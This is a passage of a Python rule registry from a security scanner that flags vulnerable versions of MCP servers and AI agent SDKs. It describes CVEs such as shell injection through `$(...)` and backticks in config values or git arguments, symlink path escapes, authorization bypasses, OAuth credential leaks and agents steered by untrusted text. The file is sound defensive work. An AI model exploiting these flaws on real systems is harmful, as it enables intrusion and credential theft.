    "through 2.0.7). There is no fixed release: 2.0.7 is the newest on PyPI and the "
    "upstream fix (PR #33) is unmerged, so every published version is treated as "
    "exposed (presence-only pin).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release to upgrade to. Run the server as a user that can "
    "reach only a scratch directory (or in a container with only that directory "
    "mounted), keep untrusted content away from an agent that holds these tools, or "
    "build from a fork that carries upstream PR #33. Pin the first fixed release "
    "once it ships.",
    sarif_name="OfficePowerPointMcpPathTraversal",
    cve_references=["CVE-2025-71427"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-02"],
    limitations=(
        "Reports a reference that names the PyPI package: a requirements, pyproject "
        "or lockfile entry, or `office-powerpoint-mcp-server` in an MCP config (the "
        "`uvx --from office-powerpoint-mcp-server ppt_mcp_server` form). A server "
        "run from a clone of the repository (`python ppt_mcp_server.py`) names no "
        "package and is not reported. Presence-only: every version is reported, a "
        "future fixed one included, until the pin gets a floor. No class rule fires "
        "on the 2.0.7 tools, so this pin is the only coverage. A file over 2 MB, or "
        "a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-PENPOT-CVE-2026-100868-001",
    "Penpot MCP plugin WebSocket bridge listens on every interface (< 2.18.0)",
    "`@penpot/mcp`, Penpot's MCP server on npm, opens a WebSocket bridge (port "
    "4402 by default) for the Penpot browser plugin. Before Penpot 2.18.0 that "
    "bridge is created as `new WebSocketServer({ port })` with no `host`, so it "
    "listens on every interface whatever `PENPOT_MCP_SERVER_HOST` says, and in "
    "single-user mode it accepts the connection without authentication. Anyone on "
    "an adjacent network can connect as the plugin, receive the agent's task "
    "payloads and return forged results (CVE-2026-100868, CVSS 3.1 6.3, "
    "GHSA-ch2q-6x56-qg5r). The fix, commit `b5274a44` (2026-09-22), is in Penpot's "
    "2.18.0 tag, but no `@penpot/mcp` has been published to npm from that tag yet, "
    "and the tag's `mcp/package.json` still reads 2.17.0 (penpot/penpot#12007). "
    "npm's own 2.17.0 was published on 2026-07-08, before the fix, and still binds "
    "every interface, so every published version is reported. The older "
    "`@penpot/mcp` pin, for the REPL RCE fixed in 2.15.0, stays a separate rule "
    "because that one is critical and this one is not.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@penpot/mcp` to the first npm release built from Penpot 2.18.0 or "
    "later once one is published, and pin it. Until then, block the plugin "
    "WebSocket port (`PENPOT_MCP_WEBSOCKET_PORT`, 4402 by default) from every "
    "other host, or run the server only on a machine that is not reachable from a "
    "shared network.",
    sarif_name="PenpotMcpPluginBridgeAllInterfaces",
    cve_references=["CVE-2026-100868"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports a reference that names `@penpot/mcp`: a package.json or lockfile "
        "entry, or `npx @penpot/mcp` in an MCP config, where an unpinned reference "
        "is reported because what npm installs by default is affected (re-checked "
        "2026-10-04: `latest` is 2.15.4 and `next` is 2.17.0, both without the fix). "
        "The floor is 2.18.0, but the fixed tag's package.json reads 2.17.0 and npm "
        "already holds a 2.17.0, so a fixed build published under a lower number "
        "would be reported until the floor follows it. It reads the npm version, not "
        "Penpot's: a self-hosted Penpot 2.18.0 server does not clear an older "
        "`@penpot/mcp`, since the bridge runs in the MCP server. A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-03 wave, third batch (#879-#883). Five watcher-filed CVEs: four new
# pins below and one more CVE on the Obot image pin. The dispositions are in
# CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-VOICEMODE-CVE-2026-79535-001",
    "VoiceMode below 8.10.2 writes MCP-supplied config values into a sourced env file unescaped",
    "`voice-mode` (PyPI; mbailey/voicemode), a voice MCP server, lets its "
    "`update_config` MCP tool (and `voicemode config set`) write a caller-supplied "
    "value into `~/.voicemode/voicemode.env`. Before 8.10.2 a value with a space "
    "or a quote was wrapped in double quotes and anything else written as is, and "
    "the service start scripts `source` that file, so `$(...)` or backticks in "
    "the value run as shell commands the next time the service starts "
    "(CVE-2026-79535, CVSS 3.1 6.3, CWE-78, GHSA-h97v-r3jw-cf6f). 8.10.2 writes "
    "only shell-inert values bare and single-quotes everything else (fix commit "
    "`c1cef853`).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `voice-mode` to 8.10.2 or later and pin it. Check "
    "`~/.voicemode/voicemode.env` for values containing `$(`, backticks or `;` "
    "written before the upgrade.",
    sarif_name="VoiceModeConfigEnvCommandInjection",
    cve_references=["CVE-2026-79535"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reports a reference that names the PyPI package: a requirements, pyproject "
        "or lockfile entry, or `voice-mode` in an MCP config, where an unpinned `uvx "
        "voice-mode` is reported as unpinned, as for the other PyPI pins. It reads "
        "versions, not the env file: a value written by an older release stays in "
        "`voicemode.env` after the upgrade. A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)

_r(
    "AAK-MCP-SHARIQ-GITHUB-CVE-2026-102906-001",
    "@0xshariq/github-mcp-server runs git commands built from tool arguments through a shell (no fixed release)",
    "`@0xshariq/github-mcp-server` (npm; 0xshariq/github-mcp-server), a git MCP "
    "server, builds its git commands as strings from tool arguments and runs them "
    "with `child_process.exec`. The Git Remove tool's `gitRemove(file)` runs "
    "`git reset HEAD \"${file}\"`, so a `file` argument carrying `$(...)` or a "
    "closing quote runs shell commands as the server's user, and an agent that "
    "reads untrusted text can be steered into that call. The only check, that the "
    "command starts with `git `, does not stop it (CVE-2026-102906, CVSS 3.1 6.3, "
    "CWE-77/CWE-78). The same `exec` of an interpolated string backs most of the "
    "other git tools. Every published version has it (2.0.0 through 2.5.0, the "
    "newest), the project has not answered the report (issue #2), and there is no "
    "fixed release, so this is a presence-only pin.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Remove the server from agents that read untrusted "
    "content, or replace it with a git MCP server that passes arguments to "
    "`execFile`/`spawn` as an array. Pin the first fixed release once it ships.",
    sarif_name="ShariqGithubMcpGitCommandInjection",
    cve_references=["CVE-2026-102906"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reports a reference that names `@0xshariq/github-mcp-server`: a "
        "package.json or lockfile entry, or the package in an MCP config. "
        "Presence-only: every version is reported, a future fixed one included, "
        "until the pin gets a floor. GitHub's own `github-mcp-server` and "
        "`@modelcontextprotocol/server-github` are different projects and are not "
        "matched. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-MARK3LABS-FS-CVE-2026-79534-001",
    "mark3labs mcp-filesystem-server image (every tag): writes follow a dangling symlink out of the allowed directories",
    "mark3labs `mcp-filesystem-server` is a Go MCP server that ships as the image "
    "`ghcr.io/mark3labs/mcp-filesystem-server` and a `go install` binary. Its "
    "`validatePath` resolves symlinks with `filepath.EvalSymlinks`, and when that "
    "fails because the target does not exist it checks only the parent directory "
    "and returns the unresolved path. A dangling symlink placed inside an allowed "
    "directory therefore passes, and `write_file`, `modify_file`, `copy_file`, "
    "`move_file` and `create_directory` follow it to create a file anywhere the "
    "server's user can write (CVE-2026-79534, CVSS 3.1 5.9, CWE-22/CWE-59). The same "
    "fallback is in every release from 0.6.0 to 0.11.1, the newest, and on `main`; "
    "there is no fixed release, and `latest` is 0.11.1.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Mount only the directories the agent needs, "
    "read-only where it only reads, and keep anything that could plant a symlink "
    "(an untrusted repository, a shared upload directory) out of the allowed "
    "directories. Pin the first fixed tag once it ships.",
    sarif_name="Mark3labsFilesystemMcpDanglingSymlinkWrite",
    cve_references=["CVE-2026-79534"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-02"],
    limitations=(
        _IMAGE_PIN_LIMITATIONS + " Every tag up to 0.11.1 is reported, and `latest` "
        "or no tag too, since `latest` was 0.11.1 on 2026-10-03. A binary from "
        "`go install github.com/mark3labs/mcp-filesystem-server` states no version "
        "anywhere AAK reads and is not reported."
    ),
)

_r(
    "AAK-MCP-OPENCLAW-CVE-2026-102807-001",
    "OpenClaw 2026.7.2 up to 2026.9.4: a read-scoped operator runs write-scoped MCP App tools",
    "OpenClaw's `mcp.app.view` method issues a standalone ticket for an MCP App "
    "view, and the ticket did not record what the issuer was allowed to do. An "
    "operator holding only `operator.read` could request one and redeem it at the "
    "MCP App view endpoint to call state-changing tools that need "
    "`operator.write` (CVE-2026-102807, CVSS 3.1 5.3, CWE-863, GHSA-3xrq-g42v-gh57). "
    "Standalone MCP Apps could call tools from 2026.7.2 (the "
    "`mcp-app-standalone.ts` host is absent in 2026.7.1). 2026.9.4 binds the "
    "ticket to the issuer's tool authority (`toolOperationsAuthorized`, fix commit "
    "`3bd8ec2b`). The extended-stable line does not carry the fix: 2026.8.35 "
    "(2026-10-02) is affected.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `openclaw` to 2026.9.4 or later and pin it. Until then, issue "
    "`operator.read` tokens only to operators you would also trust with "
    "`operator.write`.",
    sarif_name="OpenClawMcpAppStandaloneTicketAuthz",
    cve_references=["CVE-2026-102807"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports an npm reference to `openclaw` from 2026.7.2 up to 2026.9.4: a "
        "package.json or lockfile entry, or the package in an MCP config, where an "
        "unpinned reference is reported. Versions are compared on their first three "
        "numbers, so the 2026.7.2 betas before the feature landed (beta.1 to beta.3) "
        "are reported too. A later extended-stable 2026.8.x that backports the fix "
        "would still be reported until the pin learns that line. Releases below "
        "2026.7.1 belong to the older OpenClaw pin. The PyPI project `openclaw`, an "
        "unrelated installer for the cmdop CLI, is a different package and is not "
        "read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-05 wave (#887-#896). Ten watcher-filed CVEs: five new pins below, the
# Langflow pin's floor raised to 1.12.0, and four out of scope. The dispositions
# are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-ZSCALER-CVE-2026-59563-001",
    "Zscaler MCP Server 0.7.0 and 0.7.1: delete confirmation tokens are not bound to the resource",
    "`zscaler-mcp` (PyPI; zscaler/zscaler-mcp-server) asks for confirmation before "
    "a write tool runs: the first call returns an HMAC token signed over the tool "
    "name and its arguments, and the second call must present it. In 0.7.0 and "
    "0.7.1, 31 delete tools across ZIA, ZPA and ZTW passed an empty parameter set "
    "to `check_confirmation()`, so the token named no resource, and a token issued "
    "to delete one resource confirmed the delete of any other of the same type "
    "within its five-minute lifetime (CVE-2026-59563, CVSS 3.1 4.6, CWE-305). An "
    "agent given one confirmation could spend it on a resource nobody confirmed. "
    "0.6.2 bound the arguments on every call, and 0.7.2 passes each resource id "
    "into the token (zscaler/zscaler-mcp-server#41).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `zscaler-mcp` to 0.7.2 or later and pin it.",
    sarif_name="ZscalerMcpConfirmationTokenReplay",
    cve_references=["CVE-2026-59563"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports a reference that names the PyPI package `zscaler-mcp` at 0.7.0 or "
        "0.7.1: a requirements, pyproject or lockfile entry, or the package in an "
        "MCP config, where an unpinned `uvx zscaler-mcp` is reported as unpinned, as "
        "for the other PyPI pins. `zscaler-mcp-server`, the name in the README's uvx "
        "example, is not a PyPI package and is not read. The Docker Hub image has no "
        "tag below 0.12, so there is no image to pin. A file over 2 MB, or a "
        "lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-UTCP-CVE-2026-101057-001",
    "utcp-mcp below 1.1.3 dials plain-HTTP MCP server URLs from a call template",
    "`utcp-mcp` (PyPI), the MCP plugin of python-utcp, connects to the HTTP and "
    "WebSocket MCP server URLs in a call template's `mcpServers` configuration. "
    "Before 1.1.3 it dialed them as configured, without the HTTPS/WSS-or-loopback "
    "check the HTTP-family plugins apply, so a template naming a plain-HTTP, "
    "non-loopback server sends the MCP handshake in cleartext, open to "
    "interception, and can reach internal hosts (CVE-2026-101057, CVSS 3.1 3.1, "
    "CWE-319). The configuration is operator-authored, which limits practical "
    "exploitation. 1.1.3 adds `_ensure_secure_mcp_url` and runs it on every server "
    "URL before any connection.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Upgrade `utcp-mcp` to 1.1.3 or later and pin it, and use `https://` or "
    "`wss://` for any MCP server that is not on loopback.",
    sarif_name="UtcpMcpCleartextServerUrl",
    cve_references=["CVE-2026-101057"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    adversa_references=["ADV-TRANSPORT-01"],
    limitations=(
        "Reports a reference that names the PyPI package `utcp-mcp` below 1.1.3: a "
        "requirements, pyproject or lockfile entry, or the package in an MCP config, "
        "where an unpinned reference is reported. It reads the version, not the call "
        "template. `AAK-TRANSPORT-001`, which flags an `http://` MCP server URL, "
        "reads a top-level `mcpServers`, and utcp nests it under the template's "
        "`config` or passes it inline from Python, so a plain-HTTP URL in a template "
        "is not reported on its own. A file over 2 MB, or a lockfile over 32 MiB, is "
        "not read."
    ),
)

_r(
    "AAK-MCP-TOOLBOX-CVE-2026-102242-001",
    "Google MCP Toolbox 1.2.0 to 1.9.0: local-path checks follow symlinks out of the allowed roots",
    "Google MCP Toolbox for Databases (googleapis/mcp-toolbox), which MCP clients "
    "start through the npm launcher `@toolbox-sdk/server`, checks the local paths "
    "its Cloud Storage tools read and write (`download_object`, `upload_object`, "
    "and the `allowedLocalRoots` option from 1.5.0) lexically, with `filepath.Clean` "
    "and `filepath.Rel`, and never resolves symlinks. A caller allowed to run those "
    "tools can follow a link inside a permitted root to read or overwrite files "
    "outside it (CVE-2026-102242, CVSS 4.0 8.6, CWE-22/CWE-59). 1.10.0 resolves "
    "links with `filepath.EvalSymlinks` before the check "
    "(googleapis/mcp-toolbox#3810).",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@toolbox-sdk/server`, and any toolbox binary or image, to 1.10.0 or "
    "later and pin it. Until then, keep symlinks out of the directories the Cloud "
    "Storage tools may use.",
    sarif_name="McpToolboxSymlinkPathTraversal",
    cve_references=["CVE-2026-102242"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-02"],
    limitations=(
        "Reports an npm reference to `@toolbox-sdk/server` from 1.2.0 up to 1.10.0: "
        "a package.json or lockfile entry, or the launcher in an MCP config, where "
        "an unpinned `npx @toolbox-sdk/server` is reported as unpinned, as for the "
        "other npm pins. The launcher runs the binary of its own version "
        "(`@toolbox-sdk/server-<os>-<arch>`), so its number is the server's. A "
        "toolbox binary started by path, or the container image, states no version "
        "AAK reads and is not reported. A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)

_r(
    "AAK-MCP-NEXTJS-CVE-2026-94486-001",
    "Next.js 16.0.0 to 16.3.7: the `next dev` server's MCP endpoint answers cross-site requests (dev server only)",
    "Next.js 16's development server (`next dev`) serves a Model Context Protocol "
    "endpoint for coding agents. Before 16.3.8 it did not reliably check which site "
    "a request came from, so a malicious page the developer visits while the dev "
    "server runs can reach it and read the project's location on disk, source "
    "snippets from error reports, the route inventory and the development logs "
    "(CVE-2026-94486, CVSS 4.0 2.3, CWE-346, GHSA-39w2-rjm5-chcv). Dev server only: "
    "production deployments (`next start`, a static export, a hosted build) do not "
    "serve the endpoint. The MCP middleware arrived in 16.0.0, and 16.3.8 fixes it "
    "(fix commit `2d9f50a`).",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Upgrade `next` to 16.3.8 or later and pin it. Until then, stop `next dev` when "
    "it is not in use. Production builds need no change.",
    sarif_name="NextjsDevServerMcpCrossSite",
    cve_references=["CVE-2026-94486"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    adversa_references=["ADV-NETWORK-01"],
    limitations=(
        "Dev server only, so a project that never runs `next dev` is reported "
        "without being exposed. Reads a `\"next\"` dependency entry or a versioned "
        "`npx next@<version>` launch, reporting a range that admits a version from "
        "16.0.0 up to 16.3.8, and the version a lockfile resolves. `latest`, "
        "`canary` and other tags state no version and are not reported, and neither "
        "is `next dev` in a script. 16.4.0 canaries compare as 16.4.0 and are not "
        "reported. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-CLAUDECODE-CVE-2026-103012-001",
    "Claude Code 2.0.68 to 2.1.259 fetched managed settings with a stored API key ahead of the Enterprise or Team sign-in",
    "Claude Code (`@anthropic-ai/claude-code`, npm) applies an organization's "
    "server-managed settings: permission deny rules, model restrictions and "
    "managed-only locks. From 2.0.68 (Claude for Enterprise; from 2.1.38 for Team) "
    "until 2.1.260 it fetched those settings with an API key stored by Claude Code, "
    "from an earlier `/login` or written to its configuration, ahead of the "
    "session's valid Enterprise or Team sign-in. When the settings endpoint "
    "rejected that key, the session started without the organization's policy, or "
    "kept applying a stale cached copy, while still operating as the "
    "organization's account (CVE-2026-103012, CVSS 4.0 2.0, CWE-696, "
    "GHSA-gfvf-j8jh-jxxw). Triggering it needed local access to a device holding "
    "such a key. Endpoint-managed (MDM or file-based) settings were not affected, "
    "and auto-update has delivered the fix.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Upgrade `@anthropic-ai/claude-code` to 2.1.260 or later and pin it, or leave "
    "auto-update on. Remove stored API keys from machines that sign in with an "
    "Enterprise or Team account.",
    sarif_name="ClaudeCodeManagedSettingsStoredKey",
    cve_references=["CVE-2026-103012"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports `@anthropic-ai/claude-code` from 2.0.68 up to 2.1.260 where a "
        "project states its version: a package.json or lockfile entry, or a "
        "versioned `npx` reference in an MCP config. An unpinned reference is not "
        "reported, as for the folder-trust pin on the same package: it resolves to "
        "the newest release, and the CLI updates itself. A global install, the usual "
        "one, is in no file AAK reads. A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-05 wave, second batch (#900-#901). Two more watcher-filed CVEs while
# 0.6.16 was being cut: one new pin below, and a WordPress plugin out of scope.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-LANGGRAPHSDK-CVE-2026-104873-001",
    "LangGraph SDK 0.1.45 to 0.4.3: resource-scoped auth decorators ignore `actions`",
    "`langgraph-sdk` (PyPI) supplies the custom-auth decorators a LangGraph server "
    "deployment uses to authorize access to threads, assistants and crons. From "
    "0.1.45 until 0.4.4, `@auth.on.threads`, `@auth.on.assistants` and "
    "`@auth.on.crons` accepted an `actions` argument and registered the handler "
    "for every action on the resource anyway. That wildcard handler is chosen "
    "before broader fallback handlers, so an authenticated user can get past "
    "fallback action, ownership or permission checks and read, update or delete "
    "another user's thread, assistant or cron (CVE-2026-104873, CVSS 4.0 7.6, "
    "GHSA-fvww-7h3r-vfhp). Only a Python deployment that passes `actions` to one "
    "of those decorators is exposed, and one whose handler checks every action "
    "it receives stays protected. 0.4.4 registers the handler for the named "
    "actions only.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `langgraph-sdk` to 0.4.4 or later and pin it. Until then, make every "
    "handler registered with `actions` enforce the checks for all actions on its "
    "resource, or register it through `@auth.on(resources=..., actions=...)` or a "
    "per-action decorator such as `@auth.on.threads.create`, which honor the action.",
    sarif_name="LangGraphSdkAuthActionsIgnored",
    cve_references=["CVE-2026-104873"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports a reference that names the PyPI package `langgraph-sdk` from 0.1.45 "
        "up to 0.4.4: a requirements, pyproject or lockfile entry, or the package in "
        "an MCP config, where an unpinned reference is reported. It reads the "
        "version, not the auth handlers, so a project that uses the SDK only as a "
        "client, or never passes `actions` to these decorators, is reported without "
        "being exposed. The JavaScript `@langchain/langgraph-sdk` is a different "
        "package and is not read. A file over 2 MB, or a lockfile over 32 MiB, is "
        "not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-06 wave (#903-#907). Five watcher-filed CVEs: three join the Langflow
# pin (which now also reads langflow-base and lfx), and two get container image
# pins. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-DIFY-CVE-2026-105761-001",
    "Dify below 1.16.0: a workspace member can change another app's MCP server",
    "Dify (langgenius/dify), a self-hosted LLM app platform, can publish an app as "
    "an MCP server. Before 1.16.0, `PUT /console/api/apps/<app_id>/server` loaded "
    "the AppMCPServer by the server id the client sent, without checking that it "
    "belonged to the requested app and tenant, so an authenticated workspace member "
    "could change another app's MCP server status and parameters, redirecting its "
    "data or switching it off (CVE-2026-105761, CVSS 3.1 7.1, CWE-639, "
    "GHSA-ccrj-frp2-c945). The server ships as the Docker Hub image "
    "`langgenius/dify-api`, which Dify's compose file pins by version. 1.16.0 "
    "looks the server up by its app and tenant (fix commit `62cb5b5`).",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade the `langgenius/dify-api` image to 1.16.0 or later and pin its tag.",
    sarif_name="DifyMcpServerCrossAppUpdate",
    cve_references=["CVE-2026-105761"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `langgenius/dify-api` image references below 1.16.0 in compose files, "
        "Kubernetes manifests, Helm values, Dockerfiles and MCP configs. The bare "
        "Docker Hub name is matched, so `docker.io/langgenius/dify-api` is not read. "
        "`latest` was 1.17.1 on 2026-10-06, so an untagged reference is not "
        "reported. A source checkout run without the image states no version AAK "
        "reads, and `langgenius/dify-web` is not pinned because the endpoint is in "
        "the API server."
    ),
)

_r(
    "AAK-MCP-K6-CVE-2026-89039-001",
    "Grafana mcp-k6 0.3.0 to 0.6.1: the convert_playwright_script prompt reads any file",
    "Grafana's `mcp-k6`, an MCP server for the k6 load-testing tool, has a "
    "`convert_playwright_script` prompt that takes a script path. From 0.3.0, "
    "when the prompt arrived, until 0.7.0, a caller could pass a bare path and get "
    "back any file the server's user can read, SSH keys and cloud credentials "
    "included, and a symlink inside the working directory took an `@`-prefixed "
    "path outside it (CVE-2026-89039, CVSS 3.1 6.5, CWE-22/CWE-424). It is a Go "
    "binary, and its recommended install is the Docker Hub image `grafana/mcp-k6`. "
    "In 0.7.0 a bare value is script text, never a path, and an `@` reference must "
    "name a `.js`/`.ts`-family file inside the working directory, read through a "
    "handle that will not leave it, links included (grafana/mcp-k6#191).",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-k6` to 0.7.0 or later. Docker Hub had no 0.7.0 image on "
    "2026-10-06, so until one is pushed, run the 0.7.0 release binary or build "
    "the image from the v0.7.0 tag, and do not expose the prompt to untrusted "
    "callers.",
    sarif_name="McpK6PlaywrightScriptFileRead",
    cve_references=["CVE-2026-89039"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-02"],
    limitations=(
        "Reads `grafana/mcp-k6` image references from 0.3.0 up to 0.7.0, and an "
        "untagged or `latest` reference, because `latest` was the 0.6.1 image on "
        "2026-10-06. That needs revisiting once a 0.7.0 image is pushed. Tags 0.1.0 "
        "and 0.2.0 predate the prompt and are not reported. The bare Docker Hub name "
        "is matched, so `docker.io/grafana/mcp-k6` is not read. A Homebrew install "
        "or a release binary states no version AAK reads."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-07 batch (#911-#915). Five watcher-filed CVEs: one new pin below, and
# four out of scope. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-TSSDK-CVE-2026-104850-001",
    "MCP TypeScript SDK 1.12.0 to 1.30.1 (2.x client below 2.2.0): the MCP server picks where OAuth credentials go",
    "The official MCP TypeScript SDK (`@modelcontextprotocol/sdk` on npm for 1.x, "
    "`@modelcontextprotocol/client` for 2.x) can act as an MCP client over HTTP "
    "with OAuth. From 1.12.0, when the client began reading the authorization "
    "server from the MCP server's protected resource metadata, until 1.31.0 and "
    "2.2.0, stored and pre-provisioned credentials were not bound to the "
    "authorization server they belong to. A malicious or compromised MCP server "
    "could name its own authorization server, and with no user interaction the "
    "client sent it the `refresh_token` and `client_secret` stored from an "
    "earlier sign-in (1.x), or the `client_secret` or signed assertion of a "
    "bundled non-interactive provider (1.x and 2.x) (CVE-2026-104850, CVSS 3.1 "
    "7.5, CWE-345/CWE-522, GHSA-6qxp-vccf-f47h). Only an application that uses "
    "the SDK as an MCP client over HTTP with an `authProvider` (its own "
    "`OAuthClientProvider`, or the bundled `ClientCredentialsProvider`, "
    "`PrivateKeyJwtProvider`, `StaticPrivateKeyJwtProvider` or, on 2.x, "
    "`CrossAppAccessProvider`) and may connect to an MCP server it does not fully "
    "trust is exposed. 1.31.0 and 2.2.0 record the authorization server as "
    "`issuer` on saved credentials and do not send them to another one.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@modelcontextprotocol/sdk` to 1.31.0 or later, or on 2.x "
    "`@modelcontextprotocol/client` (and `@modelcontextprotocol/core`, if you import "
    "it directly) to 2.2.0 or later, and pin it. The upgrade alone is not enough: "
    "pass `expectedIssuer` to the bundled providers, add `issuer` to credentials "
    "saved before the upgrade or clear them, and have your own `OAuthClientProvider` "
    "save the `issuer` it is given. Rotate any credential a client may have sent to "
    "an MCP server you do not trust.",
    sarif_name="McpTypeScriptSdkOAuthIssuerConfusion",
    cve_references=["CVE-2026-104850"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-SUPPLY-08"],
    limitations=(
        "Reports `@modelcontextprotocol/sdk` from 1.12.0 up to 1.31.0 and "
        "`@modelcontextprotocol/client` below 2.2.0 where a package.json, lockfile "
        "or MCP config states the version, reporting a range that admits an affected "
        "version. `latest` and other tags state no version and are not reported. It "
        "reads the version, not how the SDK is used, so an MCP server built on the "
        "SDK, or a client that speaks only stdio, is reported without being exposed. "
        "`@modelcontextprotocol/core` is not read: the advisory names it only as an "
        "upgrade for direct importers, and `@modelcontextprotocol/client` 2.2.0 pins "
        "it at 2.2.0. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-08 batch (#916-#921). Three new pins below, the Claude Code
# folder-trust pin's floor raised, CVE-2026-52001 cited on the mcp-remote pin,
# and a WordPress plugin out of scope. The dispositions are in CHANGELOG.cves.md.
# ---------------------------------------------------------------------------
_r(
    "AAK-MCP-PAYLOAD-CVE-2026-105806-001",
    "Payload MCP plugin 3.61.0 to 3.87.x: a user can manage another account's MCP API keys",
    "Payload's `@payloadcms/plugin-mcp` serves a Payload CMS app over MCP and "
    "authenticates MCP clients with API keys kept in a collection the plugin "
    "creates. From 3.61.0, its first release, until 3.88.0, that collection had no "
    "access rules, so an authenticated user could manage MCP API keys outside "
    "their own account, an escalation to account takeover (CVE-2026-105806, "
    "CVSS 4.0 8.6, CWE-862, GHSA-2q76-m6w6-qgc6). 3.88.0 adds access rules that "
    "scope each key to its user (payloadcms/payload#17751).",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@payloadcms/plugin-mcp` to 3.88.0 or later and pin it. Then review "
    "the MCP API keys collection for keys tied to an account other than the user "
    "who created them, and revoke any you cannot account for.",
    sarif_name="PayloadMcpApiKeyAccessControl",
    cve_references=["CVE-2026-105806"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports `@payloadcms/plugin-mcp` from 3.61.0 up to 3.88.0 where a "
        "package.json, lockfile or MCP config states the version, reporting a range "
        "that admits an affected version. `latest` was 3.90.2 on 2026-10-08 and "
        "states no version, so it is not reported, and 4.0.0 canaries compare as "
        "4.0.0 and are not reported either. A version below 3.61.0, such as the "
        "0.0.1-alpha.0 placeholder that predates the first release, is not reported. "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-LANGCHAIN-REDIS-CVE-2026-105799-001",
    "LangChain.js Redis vector store below 1.1.1: unescaped filter values widen a RediSearch query",
    "`@langchain/redis` is LangChain.js's Redis vector store. Before 1.1.1 it put "
    "filter values into RediSearch queries unescaped, in the structured TAG and "
    "TEXT filters, and only partly escaped in the older string-array filter, so "
    "injected RediSearch syntax could change or widen the query. An application "
    "that builds a tenant or document-access boundary from a filter an attacker "
    "can influence can then return indexed documents outside that boundary "
